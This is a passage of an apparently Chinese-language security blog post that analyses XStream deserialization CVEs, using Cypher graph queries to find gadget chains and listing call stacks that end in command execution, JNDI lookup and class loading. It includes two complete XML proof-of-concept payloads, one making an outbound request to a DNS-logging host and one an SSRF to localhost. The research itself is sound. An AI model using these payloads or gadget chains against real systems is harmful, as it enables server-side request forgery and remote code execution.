path&#x3D;(m1:Method)-[r:CALL]-(m2:Method&#123;NAME:&quot;openStream&quot;,CLASSNAME:&quot;java.net.URL&quot;&#125;) return m1.CLASSNAME,m1.NAME,m1.PARAMETERS</span><br></pre></td></tr></table></figure><p>节点很多，以javax.activation.URLDataSource$getInputStream 为例</p><p><img src="/images/pasted-156.png" alt="upload successful"></p><h4 id="寻找Trigger"><a href="#寻找Trigger" class="headerlink" title="寻找Trigger"></a>寻找Trigger</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;m0d9 xstream URL URLData</span><br><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;,&quot;hashCode&quot;,&quot;equals&quot;,&quot;compareTo&quot;,&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where  m1.NAME&#x3D;&quot;getOutputStream&quot; and m1.CLASSNAME&#x3D;&quot;javax.activation.URLDataSource&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 10) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-161.png" alt="upload successful"></p><!-- ![upload successful](/images/pasted-144.png) --><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&quot;custom&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&quot;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">order</span>&gt;</span>false<span class="tag">&lt;/<span class="name">order</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.ws.client.ResponseContext&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span> <span class="attr">class</span>=<span class="string">&quot;java.util.IdentityHashMap&quot;</span> <span class="attr">serialization</span>=<span class="string">&quot;custom&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">java.util.IdentityHashMap</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">size</span>&gt;</span>0<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">int</span>&gt;</span>0<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">java.util.IdentityHashMap</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">satellites</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&quot;javax.activation.URLDataSource&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://cve21342.xstream.1.dns.m0d9.me/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">wasTransportSecure</span>&gt;</span>false<span class="tag">&lt;/<span class="name">wasTransportSecure</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">isAdapterDeliversNonAnonymousResponse</span>&gt;</span>false<span class="tag">&lt;/<span class="name">isAdapterDeliversNonAnonymousResponse</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">packetTakesPriorityOverRequestContext</span>&gt;</span>false<span class="tag">&lt;/<span class="name">packetTakesPriorityOverRequestContext</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">state</span>&gt;</span>ServerRequest<span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">isFastInfosetDisabled</span>&gt;</span>false<span class="tag">&lt;/<span class="name">isFastInfosetDisabled</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="CVE-2021-39152"><a href="#CVE-2021-39152" class="headerlink" title="CVE-2021-39152"></a>CVE-2021-39152</h3><p>这个链应该是 ssrf最短的链了</p><h4 id="寻找Bullet-1"><a href="#寻找Bullet-1" class="headerlink" title="寻找Bullet"></a>寻找Bullet</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.net.URL#openConnection</span><br></pre></td></tr></table></figure><h4 id="寻找中间链-1"><a href="#寻找中间链-1" class="headerlink" title="寻找中间链"></a>寻找中间链</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;m0d9 xstream URLDNS</span><br><span class="line">match path&#x3D;(m1:Method)-[r:CALL]-(m2:Method&#123;NAME:&quot;openConnection&quot;,CLASSNAME:&quot;java.net.URL&quot;&#125;) return m1.CLASSNAME,m1.NAME,m1.PARAMETERS</span><br></pre></td></tr></table></figure><p>节点很多，以jdk.nashorn.internal.runtime.Source$URLData#loadMeta 为例<br><img src="/images/pasted-160.png" alt="upload successful"></p><h4 id="寻找Trigger-1"><a href="#寻找Trigger-1" class="headerlink" title="寻找Trigger"></a>寻找Trigger</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;m0d9 xstream URL URLData</span><br><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;,&quot;hashCode&quot;,&quot;equals&quot;,&quot;compareTo&quot;,&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where  m1.NAME&#x3D;&quot;loadMeta&quot; and m1.CLASSNAME&#x3D;&quot;jdk.nashorn.internal.runtime.Source$URLData&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 10) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-159.png" alt="upload successful"></p><h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.runtime.Source_-URLData</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://localhost:8080/internal/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">cs</span>&gt;</span>GBK<span class="tag">&lt;/<span class="name">cs</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">hash</span>&gt;</span>1111<span class="tag">&lt;/<span class="name">hash</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">array</span>&gt;</span>b<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">length</span>&gt;</span>0<span class="tag">&lt;/<span class="name">length</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">lastModified</span>&gt;</span>0<span class="tag">&lt;/<span class="name">lastModified</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.runtime.Source_-URLData</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.runtime.Source_-URLData</span> <span class="attr">reference</span>=<span class="string">&#x27;../jdk.nashorn.internal.runtime.Source_-URLData&#x27;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.runtime.Source_-URLData</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://localhost:8080/internal/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">cs</span> <span class="attr">reference</span>=<span class="string">&#x27;../../../entry/jdk.nashorn.internal.runtime.Source_-URLData/cs&#x27;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">hash</span>&gt;</span>1111<span class="tag">&lt;/<span class="name">hash</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">array</span>&gt;</span>b<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">length</span>&gt;</span>0<span class="tag">&lt;/<span class="name">length</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">lastModified</span>&gt;</span>0<span class="tag">&lt;/<span class="name">lastModified</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.runtime.Source_-URLData</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.runtime.Source_-URLData</span> <span class="attr">reference</span>=<span class="string">&#x27;../jdk.nashorn.internal.runtime.Source_-URLData&#x27;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="CVE-2021-21351"><a href="#CVE-2021-21351" class="headerlink" title="CVE-2021-21351"></a>CVE-2021-21351</h3><h4 id="寻找核心调用链1"><a href="#寻找核心调用链1" class="headerlink" title="寻找核心调用链1"></a>寻找核心调用链1</h4><p>中间链以com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces#parseSome为例</p><p><img src="/images/pasted-171.png" alt="upload successful"></p><p><img src="/images/pasted-172.png" alt="upload successful"><br>发现method、class、args都可控，需要做的就是找到一条链</p><h4 id="寻找核心调用链2"><a href="#寻找核心调用链2" class="headerlink" title="寻找核心调用链2"></a>寻找核心调用链2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;,&quot;hashCode&quot;,&quot;equals&quot;,&quot;compareTo&quot;,&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;parseSome&quot; and m1.CLASSNAME&#x3D;&quot;com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,10) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-170.png" alt="upload successful"></p><h4 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h4><p>调用链如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">connect:615, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">parseSome:370, IncrementalSAXSource_Xerces (com.sun.org.apache.xml.internal.dtm.ref)</span><br><span class="line">deliverMoreNodes:309, IncrementalSAXSource_Xerces (com.sun.org.apache.xml.internal.dtm.ref)</span><br><span class="line">nextNode:814, SAX2DTM (com.sun.org.apache.xml.internal.dtm.ref.sax2dtm)</span><br><span class="line">_firstch:534, DTMDefaultBase (com.sun.org.apache.xml.internal.dtm.ref)</span><br><span class="line">getStringValue:1294, SAX2DTM (com.sun.org.apache.xml.internal.dtm.ref.sax2dtm)</span><br><span class="line">str:206, XRTreeFrag (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">toString:312, XObject (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals:391, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">compareTo:441, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">compareTo:420, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">put:568, TreeMap (java.util)</span><br><span class="line">putAll:281, AbstractMap (java.util)</span><br><span class="line">putAll:327, TreeMap (java.util)</span><br><span class="line">populateTreeMap:121, TreeMapConverter (com.thoughtworks.xstream.converters.collections)</span><br></pre></td></tr></table></figure><h3 id="CVE-2021-21346"><a href="#CVE-2021-21346" class="headerlink" title="CVE-2021-21346"></a>CVE-2021-21346</h3><h4 id="核心调用链"><a href="#核心调用链" class="headerlink" title="核心调用链"></a>核心调用链</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;,&quot;hashCode&quot;,&quot;equals&quot;,&quot;compareTo&quot;,&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;createValue&quot; and m1.CLASSNAME&#x3D;&quot;sun.swing.SwingLazyValue&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,10) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-175.png" alt="upload successful"></p><h4 id="调用栈-1"><a href="#调用栈-1" class="headerlink" title="调用栈"></a>调用栈</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">doLookup:290, InitialContext (javax.naming)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">createValue:73, SwingLazyValue (sun.swing)</span><br><span class="line">getFromHashtable:216, UIDefaults (javax.swing)</span><br><span class="line">get:161, UIDefaults (javax.swing)</span><br><span class="line">get:64, MultiUIDefaults (javax.swing)</span><br><span class="line">toString:197, MultiUIDefaults (javax.swing)</span><br><span class="line">equals:391, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">compareTo:441, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">compareTo:420, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">put:568, TreeMap (java.util)</span><br><span class="line">putAll:281, AbstractMap (java.util)</span><br><span class="line">putAll:327, TreeMap (java.util)</span><br></pre></td></tr></table></figure><h3 id="CVE-2020-21347-21350"><a href="#CVE-2020-21347-21350" class="headerlink" title="CVE-2020-21347/21350"></a>CVE-2020-21347/21350</h3><p>21347/21350这两个类似，都是用NameProcessIterator自定义classloader加载，链也比较简单。</p><h4 id="核心调用链1"><a href="#核心调用链1" class="headerlink" title="核心调用链1"></a>核心调用链1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">match path&#x3D;(sink:Method &#123;IS_SINK:true, NAME:&quot;loadClass&quot;&#125;)&lt;-[:CALL]-(m1:Method) return m1.CLASSNAME,m1.NAME,m1.PARAMETERS</span><br><span class="line">order by m1.CLASSNAME</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-176.png" alt="upload successful"></p><h4 id="核心调用链2"><a href="#核心调用链2" class="headerlink" title="核心调用链2"></a>核心调用链2</h4><p>比较难搞的是hasNext关联Next，很容易关联到Trigger，造成误报</p><p>需要手动发现至SequenceInputStream.nextStream，然后参考CVE-2020-26217的ByteArrayOutputStreamEx链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">match path&#x3D;(m1:Method&#123;NAME:&quot;hasNext&quot;,CLASSNAME:&quot;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&quot;&#125;)-[r:CALL|ALIAS*3..10]-(m2:Method) </span><br><span class="line">where m2.NAME in [&quot;toString&quot;]</span><br><span class="line">return path limit 200</span><br></pre></td></tr></table></figure><p>这部分的与之类似，不单独列了</p><h4 id="调用栈-2"><a href="#调用栈-2" class="headerlink" title="调用栈"></a>调用栈</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">loadClass:131, ClassLoader (com.sun.org.apache.bcel.internal.util)</span><br><span class="line">loadClass:357, ClassLoader (java.lang)</span><br><span class="line">hasNext:409, JavacProcessingEnvironment$NameProcessIterator (com.sun.tools.javac.processing)</span><br><span class="line">hasMoreElements:148, MultiUIDefaults$MultiUIDefaultsEnumerator (javax.swing)</span><br><span class="line">nextStream:109, SequenceInputStream (java.io)</span><br><span class="line">read:211, SequenceInputStream (java.io)</span><br><span class="line">readFrom:65, ByteArrayOutputStreamEx (com.sun.xml.internal.bind.v2.util)</span><br><span class="line">get:182, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">toString:286, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">compare:153, ObservableList$1 (javafx.collections)</span><br><span class="line">siftDownUsingComparator:721, PriorityQueue (java.util)</span><br><span class="line">siftDown:687, PriorityQueue (java.util)</span><br><span class="line">heapify:736, PriorityQueue (java.util)</span><br></pre></td></tr></table></figure><h3 id="CVE-2020-26217"><a href="#CVE-2020-26217" class="headerlink" title="CVE-2020-26217"></a>CVE-2020-26217</h3><h4 id="核心调用链1-1"><a href="#核心调用链1-1" class="headerlink" title="核心调用链1"></a>核心调用链1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;,&quot;hashCode&quot;,&quot;equals&quot;,&quot;compareTo&quot;,&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;filter&quot; and m1.CLASSNAME&#x3D;&quot;javax.imageio.ImageIO$ContainsFilter&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,10) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-173.png" alt="upload successful"></p><h4 id="转接点"><a href="#转接点" class="headerlink" title="转接点"></a>转接点</h4><p>可以看到，只标注了部分的链，原因为javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator#nextElement-&gt;java.util.Enumeration#nextElement-&gt; javax.naming.NameImpl#equals 无法走通。这种情况在后续的case种也会经常遇到，因为Java有多态特性，而ALIAS是纯静态分析。</p><p>上述链没办法打通Trigger，这个时候需要手动分析，发现java.io.SequenceInputStream#nextStream可以调用e.nextElement且e可控。如此，接着分析nextStream到Trigger的可行性。</p><h4 id="核心调用链2-1"><a href="#核心调用链2-1" class="headerlink" title="核心调用链2"></a>核心调用链2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;nextStream&quot; and m1.CLASSNAME&#x3D;&quot;java.io.SequenceInputStream&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,8) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-174.png" alt="upload successful"></p><h4 id="调用栈-3"><a href="#调用栈-3" class="headerlink" title="调用栈"></a>调用栈</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">start:1007, ProcessBuilder (java.lang)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect) [2]</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">filter:613, ImageIO$ContainsFilter (javax.imageio)</span><br><span class="line">advance:834, FilterIterator (javax.imageio.spi)</span><br><span class="line">next:852, FilterIterator (javax.imageio.spi)</span><br><span class="line">nextElement:153, MultiUIDefaults$MultiUIDefaultsEnumerator (javax.swing)</span><br><span class="line">nextStream:110, SequenceInputStream (java.io)</span><br><span class="line">read:211, SequenceInputStream (java.io)</span><br><span class="line">readFrom:65, ByteArrayOutputStreamEx (com.sun.xml.internal.bind.v2.util)</span><br><span class="line">get:182, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">toString:286, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">getStringValue:121, NativeString (jdk.nashorn.internal.objects)</span><br><span class="line">hashCode:117, NativeString (jdk.nashorn.internal.objects)</span><br><span class="line">hash:339, HashMap (java.util)</span><br><span class="line">put:612, HashMap (java.util)</span><br></pre></td></tr></table></figure><h3 id="CVE-2021-21344-21345"><a href="#CVE-2021-21344-21345" class="headerlink" title="CVE-2021-21344/21345"></a>CVE-2021-21344/21345</h3><p>21344/21345的这个Gadgets核心在DataTransferer$IndexedComparator到GetterSetterReflection的流程，流程比较复杂</p><h4 id="调用栈-4"><a href="#调用栈-4" class="headerlink" title="调用栈"></a>调用栈</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">verify:173, ServerTableEntry (com.sun.corba.se.impl.activation)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">get:343, Accessor$GetterSetterReflection (com.sun.xml.internal.bind.v2.runtime.reflect)</span><br><span class="line">serializeURIs:402, ClassBeanInfoImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">childAsXsiType:662, XMLSerializer (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">write:256, MarshallerImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">marshal:89, BridgeImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">marshal:130, Bridge (com.sun.xml.internal.bind.api)</span><br><span class="line">marshal:161, BridgeWrapper (com.sun.xml.internal.ws.db.glassfish)</span><br><span class="line">writeTo:109, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">asInputStream:99, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">getInputStream:125, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">getMessage:366, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)</span><br><span class="line">getAttachments:465, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)</span><br><span class="line">getAttachments:103, MessageWrapper (com.sun.xml.internal.ws.api.message)</span><br><span class="line">get:111, ResponseContext (com.sun.xml.internal.ws.client)</span><br><span class="line">compareIndices:2492, DataTransferer$IndexedComparator (sun.awt.datatransfer)</span><br><span class="line">compare:2971, DataTransferer$IndexOrderComparator (sun.awt.datatransfer)</span><br><span class="line">siftDownUsingComparator:722, PriorityQueue (java.util)</span><br><span class="line">siftDown:688, PriorityQueue (java.util)</span><br><span class="line">heapify:737, PriorityQueue (java.util)</span><br><span 